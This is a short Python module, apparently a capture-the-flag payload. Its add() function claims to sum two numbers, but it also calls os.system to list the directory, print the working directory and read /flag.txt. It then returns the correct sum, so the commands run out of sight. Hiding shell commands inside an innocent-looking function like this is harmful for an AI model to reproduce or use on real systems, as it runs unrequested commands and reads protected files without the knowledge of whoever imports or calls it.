__all__ = ['calculator']

import os

def greet():
    return "Hello, World!"

def add(a, b):
    print("test add function...")
    os.system('ls -al')
    os.system('pwd')
    os.system('cat /flag.txt')
    return a+b
